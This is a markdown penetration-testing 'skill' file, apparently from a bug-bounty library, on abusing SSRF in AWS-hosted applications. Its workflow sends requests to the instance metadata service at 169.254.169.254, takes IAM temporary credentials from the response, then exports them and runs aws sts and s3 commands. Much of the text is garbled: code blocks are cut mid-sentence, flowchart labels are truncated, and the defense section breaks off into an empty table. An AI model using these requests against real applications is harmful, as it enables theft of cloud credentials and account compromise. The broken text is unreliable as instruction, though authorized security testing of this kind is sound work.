---
name: ssrf-aws-metadata-abuse
description: >
  Exploit Server-Side Request Forgery (SSRF) vulnerabilities in applications hosted on AWS to 
  access the highly sensitive Instance Metadata Service (IMDS). This allows an attacker to steal 
  valid IAM roles and temporary security credentials, leading to catastrophic cloud account compromise.
domain: cybersecurity
subdomain: penetration-testing
category: Cloud Security
difficulty: advanced
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0006, TA0009]
  techniques: [T1552.005, T1528]
platforms: [aws, web]
tags: [ssrf, aws, imds, cloud-security, penetration-testing, iam]
tools: [burp-suite, aws-cli]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# SSRF to AWS Metadata Abuse

## When to Use
- When you discover an SSRF vulnerability (a feature that fetches external URLs based on user input) in an application that you suspect or know is hosted on Amazon Web Services (AWS).
- To demonstrate the critical impact of SSRF by escalating from a web vulnerability to full cloud environment compromise via IAM credential theft.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying SSRF

```text
# Concept: The application takes a URL ```

### Phase 2: Querying the AWS IMDS (Instance Metadata Service)

```http
# Concept: AWS instances 1. IMDSv1 (The older, easily exploitable POST /api/fetch-image HTTP/1.1
Host: target.com
{"url": "http://169.254.169.254/latest/meta-data/"}

# Target POST /api/fetch-image HTTP/1.1
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# Response HTTP/1.1 200 OK
ec2-role-name
```

### Phase 3: Stealing IAM Credentials

```http
# 1. Fetch POST /api/fetch-image HTTP/1.1
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-name"}

# Response {
  "Code" : "Success",
  "LastUpdated" : "2023-10-27T01:02:03Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "...",
  "Token" : "IQoJb3JpZ2lu...",
  "Expiration" : "2023-10-27T07:15:30Z"
}
```

### Phase 4: Abusing the Credentials

```bash
# export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2lu..."

# aws sts get-caller-identity
aws s3 ls
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Discover SSRF ] --> B{Try IMDS ]}
    B -->|Success| C[Extract ]
    B -->|Timeout/Block| D[Attempt ]
    C --> E[Exploit ]
```

## 🔵 Blue Team Detection & Defense
- **Enforce IMDSv2**: **Network Segmentation/Firewalls**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Ssrf Aws Metadata Abuse — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- AWS Documentation: [Instance metadata and user data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- PortSwigger: [SSRF](https://portswigger.net/web-security/ssrf)
